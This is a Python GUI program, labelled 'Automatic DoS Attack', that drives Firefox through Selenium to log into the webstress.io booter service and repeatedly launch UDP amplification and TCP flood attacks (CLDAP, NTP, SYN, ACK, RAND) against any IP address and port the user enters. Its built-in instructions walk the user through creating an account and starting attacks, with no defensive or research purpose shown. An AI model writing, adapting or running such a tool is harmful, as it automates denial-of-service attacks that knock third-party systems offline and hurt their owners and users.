from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import time
import threading
from tkinter import *
from tkinter import ttk
from tkinter.font import Font
from tkinter import messagebox

root = Tk()
root.title("A.D.O.S.A.")
root.iconbitmap("Icon.ico")

def verifyInputs():
    verifyCount = 0
    attStatus.config(text=" ")
    time.sleep(0.05)

    if len(repetInput.get()) == 0:
        attStatus.config(text="THE ATTACK REPETITION FIELD IS MISSING", fg="orange")
    if len(repetInput.get()) != 0:
        try:
            repetVar = int(repetInput.get())
            verifyCount = verifyCount + 1
        except ValueError:
            attStatus.config(text="THE ATTACK REPETITION ACCEPT ONLY NUMBERS", fg="orange")

    if len(timeInput.get()) == 0:
        attStatus.config(text="THE ATTACK TIME FIELD IS MISSING", fg="orange")

    if len(timeInput.get()) != 0:
        try:
            timeVar = int (timeInput.get())
            if timeVar < 15:
                attStatus.config(text="THE ATTACK TIME IS TOO LOW", fg="orange")
            elif timeVar > 300:
                attStatus.config(text="THE ATTACK TIME IS TOO HIGH", fg="orange")
            elif timeVar >= 15 and timeVar <= 300:
                verifyCount = verifyCount + 1
        except ValueError:
            attStatus.config(text="THE ATTACK TIME ACCEPT ONLY NUMBERS", fg="orange")

    if len(portInput.get()) == 0:
        attStatus.config(text="THE PORT FIELD IS MISSING", fg="orange")
    if len(portInput.get()) != 0:
        try:
            portVar = int(portInput.get())
            verifyCount = verifyCount + 1
        except ValueError:
            attStatus.config(text="THE PORT ACCEPT ONLY NUMBERS", fg="orange")

    if len(ipInput.get()) == 0:
        attStatus.config(text="THE IP FIELD IS MISSING", fg="orange")
    else:
        verifyCount = verifyCount + 1

    if verifyCount == 4:
        attStatus.config(text="VALID INPUTS...WAIT SOME SECONDS!", fg="green")
        time.sleep(1.5)
        main()

def main():
    errorCount = 0
    attStatus.config(text=" ")
    time.sleep(0.05)
    attStatus.config(text="STARTING ATTACKS..", fg="red")
    progBar['value'] = 0
    driver = webdriver.Firefox()
    driver.set_window_size(1220,995)
    driver.get("https://webstress.io/login")
    time.sleep(1.5)
    username = driver.find_element_by_name("username")
    password = driver.find_element_by_name("password")
    time.sleep(0.5)
    username.clear()
    password.clear()
    username.send_keys(userLog.get())
    time.sleep(0.5)
    password.send_keys(passLog.get())
    time.sleep(0.5)
    password.send_keys(Keys.RETURN)
    time.sleep(0.5)

    try:
        if driver.find_element_by_xpath("//div[contains(text(), 'error')]"):
            time.sleep(0.5)
            loginFrame.tkraise()
            userInput.delete(0, 'end')
            passInput.delete(0, 'end')
            logStatus.config(text="WRONG CREDENTIALS, PLEASE RETRY!", fg="red")
            time.sleep(0.3)
            driver.quit()
    except NoSuchElementException:
        scelta = methodMenu.get()
        repetValue = repetInput.get()
        if len(repetInput.get()) == 0:
            repetValue = 1

        progBar['maximum'] = int(repetValue)
        count = 0

        for x in range(int(repetValue)):
            attackECount = 0
            time.sleep(0.5)
            driver.get("https://webstress.io/hub")
            time.sleep(1)
            method = driver.find_element_by_name("method")
            method.click()

            if scelta == "UDP-CLDAP":
                method.send_keys(Keys.RETURN)
            if scelta == "UDP-NTP":
                for x in range(1):
                    method.send_keys(Keys.ARROW_DOWN)
                method.send_keys(Keys.RETURN)
            if scelta == "ARD":
                for x in range(2):
                    method.send_keys(Keys.ARROW_DOWN)
                method.send_keys(Keys.RETURN)
            if scelta == "TCP-RAND":
                for x in range(3):
                    method.send_keys(Keys.ARROW_DOWN)
                method.send_keys(Keys.RETURN)
            if scelta == "TCP-SYN":
                for x in range(4):
                    method.send_keys(Keys.ARROW_DOWN)
                method.send_keys(Keys.RETURN)
            if scelta == "TCP-ACK":
                for x in range(5):
                    method.send_keys(Keys.ARROW_DOWN)
                method.send_keys(Keys.RETURN)

            ip = driver.find_element_by_id("host")
            ip.clear()
            ip.send_keys(ipInput.get())
            port = driver.find_element_by_id("port")
            port.clear()
            port.send_keys(portInput.get())
            attackTime = driver.find_element_by_id("time")
            attackTime.clear()
            attackTime.send_keys(timeInput.get())
            driver.find_element_by_name("startAttack").click()
            time.sleep(0.5)
            try:
                if driver.find_element_by_xpath("//div[contains(text(), 'Host must be IPv4.')]"):
                    attStatus.config(text="WRONG IP, PLEASE RETRY!", fg="red")
                    time.sleep(0.3)
                    driver.quit()
            except NoSuchElementException:
                pass
            try:
                if driver.find_element_by_xpath("//div[contains(text(), 'You have exceeded your total slots in running.')]"):
                    attStatus.config(text="THERE IS ALREADY AN ATTACK IN ACTION!", fg="red")
                    errorCount = errorCount + 1
                    attackECount = attackECount + 1
            except NoSuchElementException:
                pass

            timeS = int(timeInput.get())
            time.sleep(timeS)
            if (attackECount == 0):
                count = count + 1
                progBar['value'] = count

        driver.quit()
        if (errorCount == 0):
            attStatus.config(text="ALL ATTACKS HAVE BEEN COMPLETED!", fg="green")
        else:
            attStatus.config(text= str(count)+ " OUT OF " +str(repetValue)+ " ATTACK/S HAVE BEEN COMPLETED!", fg="green")

def login():
    logStatus.config(text=" ")
    verifyCount = 0
    if len(passInput.get()) == 0:
        logStatus.config(text="THE PASSWORD MUST BE FIELLED", fg="orange")
    else:
        verifyCount = verifyCount + 1

    if len(userInput.get()) == 0:
        logStatus.config(text="THE USERNAME MUST BE FILLED", fg="orange")
    else:
        verifyCount = verifyCount + 1

    if verifyCount == 2:
        attackFrame.tkraise()

root.geometry("815x695")
root.resizable(False, False)

attackFrame = Frame(root, bg="black")
loginFrame = Frame(root, bg="black")

for frame in (loginFrame, attackFrame):
    frame.place(relwidth=1, relheight=1)

############## LOGIN SCREEEN #################

userLog = StringVar()
passLog = StringVar()

title = Label(loginFrame, text="Automatic DoS Attack", font="Courier 30 bold", bg="black", fg="white").pack()

logintext = Label(loginFrame, text="LOGIN:",font="Courier 35 bold", bg="black", fg="white").pack(pady="15")

textUser = Label(loginFrame, text="USERNAME:", font="Courier 17 bold", bg="black", fg="white").pack()
userInput = Entry(loginFrame, textvariable= userLog ,width=15, borderwidth=2, font="Default 15 bold", justify='center')
userInput.pack(pady=8)

textPass = Label(loginFrame, text="PASSWORD:", font="Courier 17 bold", bg="black", fg="white").pack()
passInput = Entry(loginFrame, textvariable= passLog, show="*", width=15, borderwidth=2, font="Default 15 bold", justify='center')
passInput.pack(pady=8)

logButton = Button(loginFrame, text="LOG IN",bg="red", fg="white", font="Bold 15 bold", command=login).pack(pady="15")

logStatus = Label(loginFrame, text="", bg="black", font="Bold 17 bold")
logStatus.pack()

textTutorTitle1 = Label(loginFrame, text="HOW IT WORKS?", font="Default 17 bold", bg="black", fg="white").pack(pady="5")
textTutor1 = Label(loginFrame, text="1-You need to create an account at webstress.io \n2-Insert your credentials at this login page \n3-Complete the different fields to do the attack \n4-Click the Start Attack button and let the program do the job", font="Default 14 bold", bg="black", fg="white").pack()
pad = Label(loginFrame, text=" ", bg="black").pack(pady="1")
textTutorTitle2 = Label(loginFrame, text="ANY PROBLEMS?", font="Default 17 bold", bg="black", fg="white").pack()
textTutor2 = Label(loginFrame, text="1-This program is only for Firefox!\n2-Every time you update Firefox, you need to check if there is \na new Web Driver for that at github.com/mozilla/geckodriver/releases", font="Default 14 bold", bg="black", fg="white").pack()

##############################################

############## ATTACK SCREEEN #################

title = Label(attackFrame, text="Automatic DoS Attack", font="Courier 30 bold", bg="black", fg="white").pack()

textIp = Label(attackFrame, text="IP Address:", font="Courier 12 bold", bg="black", fg="white").pack()
ipInput = Entry(attackFrame, width=15, borderwidth=2, font="Default 12 bold", justify='center')
ipInput.pack(pady=8)

textPort = Label(attackFrame, text="Port:", font="Courier 12 bold", bg="black", fg="white").pack()
portInput = Entry(attackFrame, width=8, borderwidth=2, font="Default 12 bold", justify='center')
portInput.pack(pady=8)

textTime = Label(attackFrame, text="Attack Time (seconds): \n[Min 15s Max 300s] ", font="Courier 12 bold", bg="black", fg="white").pack()
timeInput = Entry(attackFrame, width=5, borderwidth=2, font="Default 12 bold", justify='center')
timeInput.pack(pady=8)

methodList = [
#UDP Attack
    "UDP-CLDAP","UDP-NTP",
#TCP Attack
    "TCP-RAND","TCP-SYN","TCP-ACK"
]

methodMenu = StringVar()
methodMenu.set(methodList[0])
textMethod = Label(attackFrame, text="Method:", font="Courier 12 bold", bg="black", fg="white").pack()
methodInput = OptionMenu(attackFrame, methodMenu, *methodList).pack(pady=8)

repetText = Label(attackFrame, text="Attack repetition:", font="Courier 12 bold", bg="black", fg="white").pack()
repetInput = Entry(attackFrame, width=10, borderwidth=2, font="Default 12 bold", justify='center')
repetInput.pack(pady=8)

attStatus = Label(attackFrame, text="WAITING FOR INPUTS", bg="black", font="Bold 17 bold",fg="#004fff")
attStatus.pack(pady=10)

progBar = ttk.Progressbar(attackFrame, orient=HORIZONTAL, length=400, mode="determinate")
progBar.pack(pady=15)

startAButton = Button(attackFrame, text="Start Attack",bg="red", fg="white", font="Bold 20 bold", command=lambda:threading.Thread(target=verifyInputs).start())
startAButton.pack()
textTutor2 = Label(attackFrame, text="DO NOT TRY TO MAKE THE FIREFOX WINDOW SMALLER \nOR THE PROGRAM WON'T WORK!", font="Default 18 bold", bg="black", fg="red").pack(pady="10")
###############################################

root.mainloop()
